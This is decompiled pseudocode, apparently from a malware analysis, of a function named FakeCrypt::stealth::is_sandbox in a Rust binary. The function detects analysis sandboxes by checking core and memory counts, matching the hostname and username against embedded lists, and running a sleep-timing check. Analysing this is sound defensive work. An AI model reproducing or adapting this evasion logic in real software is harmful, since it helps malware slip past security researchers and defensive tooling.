
  uint64_t FakeCrypt::stealth::is_sandbox::hafd329d2780dcab4()

{
    void var_1d0;
    sysinfo::common::System::new_all::hc9da36646fff1f13(&var_1d0);
    char rax;
    int64_t rdx;
    rax = sysinfo::common::System::physical_core_count::hdbb8393c4be371fb();
    int32_t rbx;
    rbx = 1;
    int64_t var_68;
    
    if (rax & 1 && rdx >= 2 && var_68 >= 0x200000)
    {
        void** const var_218;
        hostname::get::h3b1635af47d30924(&var_218);
        void var_200;
        core::result::Result$LT$T$C$E$GT$::unwrap_or_default::hf494175ec33b8dd0(&var_200, &var_218);
        int64_t var_1f8;
        uint64_t var_1f0;
        alloc::string::String::from_utf8_lossy::h6007208a5a0b939d(&var_218, var_1f8, var_1f0);
        char* var_210;
        uint64_t var_208;
        void var_1e8;
        alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::ha0815f2983b5f9c9(&var_1e8, var_210, 
            var_208);
        core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::h422f01b5a2867946(&var_218);
        core::ptr::drop_in_place$LT$std..ffi..os_str..OsString$GT$::h7a05ee20b892fddb(&var_200);
        var_218 = &data_4d91f0;
        char const (** const var_210_1)[0x147] = &data_4d9230;
        
        if (_$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::any::h26f2523e8bc586fa(&var_218, &var_1e8))
        {
            rbx = 1;
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
        }
        else
        {
            whoami::api::username::h560cc38fa776b431(&var_218);
            alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::ha0815f2983b5f9c9(&var_200, var_210_1, 
                var_208);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_218);
            var_218 = &data_4d9230;
            char const (** const var_210_2)[0x13b] = &data_4d9260;
            char rax_2 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::any::h26f2523e8bc586fa(&var_218, &var_200);
            int64_t rax_4;
            
            if (!rax_2)
            {
                void** rax_3;
                int32_t rdx_4;
                rax_3 = std::time::Instant::now::h2e7a0929984309fc();
                var_218 = rax_3;
                var_210_2 = rdx_4;
                std::thread::sleep::h542b9c721528a25a(2, 0);
                rax_4 = std::time::Instant::elapsed::h3ed9b8e557e470d7(&var_218);
            }
            
            if (!rax_2 && rax_4 >= 2)
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_200);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
                rbx = 0;
            }
            else
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_200);
                rbx = 1;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
            }
        }
    }
    
    core::ptr::drop_in_place$LT$sysinfo..common..System$GT$::hc8fe3377c4e9e53b(&var_1d0);
    return rbx;
}
